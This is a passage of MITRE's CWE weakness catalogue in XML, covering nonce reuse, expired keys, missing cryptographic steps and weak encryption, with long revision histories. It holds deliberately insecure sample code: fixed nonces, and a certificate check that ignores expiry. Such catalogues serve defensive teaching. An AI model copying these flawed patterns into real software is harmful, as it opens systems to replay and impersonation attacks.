               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="323" Name="Reusing a Nonce, Key Pair in Encryption" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>Nonces should be used for the present occasion and only once.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="344" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Nonces are often bundled with a key in a communication exchange to produce a new session key for each exchange.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Potentially a replay attack, in which an attacker could send the same data twice, could be crafted if nonces are allowed to be reused. This could allow a user to send a message which masquerades as a valid message from a valid user.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Refuse to reuse nonce values.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use techniques such as requiring incrementing, time based and/or challenge response to assure uniqueness of nonces.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code takes a password, concatenates it with a nonce, then encrypts it before sending over a network:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>void encryptAndSendPassword(char *password){<xhtml:div style="margin-left:1em;">char *nonce = "bad";<xhtml:br/>...<xhtml:br/>char *data = (unsigned char*)malloc(20);<xhtml:br/>int para_size = strlen(nonce) + strlen(password);<xhtml:br/>char *paragraph = (char*)malloc(para_size);<xhtml:br/>SHA1((const unsigned char*)paragraph,parsize,(unsigned char*)data);<xhtml:br/>sendEncryptedData(data)</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the nonce used is always the same, an attacker can impersonate a trusted party by intercepting and resending the encrypted password. This attack avoids the need to learn the unencrypted password.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code sends a command to a remote server, using an encrypted password and nonce to prove the command is from a trusted party:</Intro_Text>
               <Example_Code Nature="Bad" Language="C++">
                  <xhtml:div>String command = new String("some command to execute");<xhtml:br/>MessageDigest nonce = MessageDigest.getInstance("SHA");<xhtml:br/>nonce.update(String.valueOf("bad nonce"));<xhtml:br/>byte[] nonce = nonce.digest();<xhtml:br/>MessageDigest password = MessageDigest.getInstance("SHA");<xhtml:br/>password.update(nonce + "secretPassword");<xhtml:br/>byte[] digest = password.digest();<xhtml:br/>sendCommand(digest, command)</xhtml:div>
               </Example_Code>
               <Body_Text>Once again the nonce used is always the same. An attacker may be able to replay previous legitimate commands or execute new arbitrary commands.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Reusing a nonce, key pair in encryption</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-18"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="324" Name="Use of a Key Past its Expiration Date" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses a cryptographic key or password past its expiration date, which diminishes its safety significantly by increasing the timing window for cracking attacks against that key.</Description>
         <Extended_Description>While the expiration of keys does not necessarily ensure that they are compromised, it is a significant concern that keys which remain in use for prolonged periods of time have a decreasing probability of integrity. For this reason, it is important to replace keys within a period of time proportional to their strength.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="298" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Low</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>The cryptographic key in question may be compromised, providing a malicious user with a method for authenticating as the victim.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Adequate consideration should be put in to the user interface in order to notify users previous to the key's expiration, to explain the importance of new key generation and to walk users through the process as painlessly as possible.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code attempts to verify that a certificate is valid.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if (cert = SSL_get_peer_certificate(ssl)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>foo=SSL_get_verify_result(ssl);<xhtml:br/>if ((X509_V_OK==foo) || (X509_V_ERRCERT_NOT_YET_VALID==foo))<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>//do stuff</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The code checks if the certificate is not yet valid, but it fails to check if a certificate is past its expiration date, thus treating expired certificates as valid.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Using a key past its expiration date</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 23: Improper Use of PKI, Especially SSL.&#34; Page 347"/>
            <Reference External_Reference_ID="REF-18"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Using a Key Past its Expiration Date</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="325" Name="Missing Cryptographic Step" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not implement a required step in a cryptographic algorithm, resulting in weaker encryption than advertised by the algorithm.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="358" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>Developers sometimes omit "expensive" (resource-intensive) steps in order to improve performance, especially in devices with limited memory or slower CPUs. This step may be taken under a mistaken impression that the step is unnecessary for the cryptographic algorithm.
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Requirements</Phase>
               <Note>This issue may happen when the requirements for the cryptographic algorithm are not clearly stated.
               </Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1585</Reference>
               <Description>Missing challenge-response step allows authentication bypass using public key.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1585</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Cryptography</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Missing Required Cryptographic Step</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Cryptographic Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A9</Entry_ID>
               <Entry_Name>Insecure Communications</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="68"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">Overlaps incomplete/missing security check.</Note>
            <Note Type="Relationship">Can be resultant.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Functional_Areas, Modes_of_Introduction, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description, Modes_of_Introduction, Name</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2020-08-20">Missing Required Cryptographic Step</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="326" Name="Inadequate Encryption Strength" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required.</Description>
         <Extended_Description>A weak encryption scheme can be subjected to brute force attacks that have a reasonable chance of succeeding using current attack methods and resources.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Note>An attacker may be able to decrypt the data using brute force attacks.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use an encryption scheme that is currently considered to be strong by experts in the field.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1546</Reference>
               <Description>Weak encryption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1546</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2172</Reference>
               <Description>Weak encryption (chosen plaintext attack)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2172</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1682</Reference>
               <Description>Weak encryption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1682</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1697</Reference>
               <Description>Weak encryption produces same ciphertext from the same plaintext blocks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1697</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1739</Reference>
               <Description>Weak encryption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1739</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2281</Reference>
               <Description>Weak encryption scheme</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2281</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1872</Reference>
               <Description>Weak encryption (XOR)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1872</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1910</Reference>
               <Description>Weak encryption (reversible algorithm).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1910</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1946</Reference>
               <Description>Weak encryption (one-to-one mapping).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1946</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1975</Reference>
               <Description>Encryption error uses fixed salt, simplifying brute force / dictionary attacks (overlaps randomness).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1975</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Weak Encryption</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Cryptographic Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A9</Entry_ID>
               <Entry_Name>Insecure Communications</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="112"/>
            <Related_Attack_Pattern CAPEC_ID="192"/>
            <Related_Attack_Pattern CAPEC_ID="20"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Cryptographic Foibles&#34; Page 259"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 21: Using the Wrong Cryptography.&#34; Page 315"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-08</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Clarified entry to focus on algorithms that do not have major weaknesses, but may not be strong enough for some purposes.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Maintenance_Notes, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
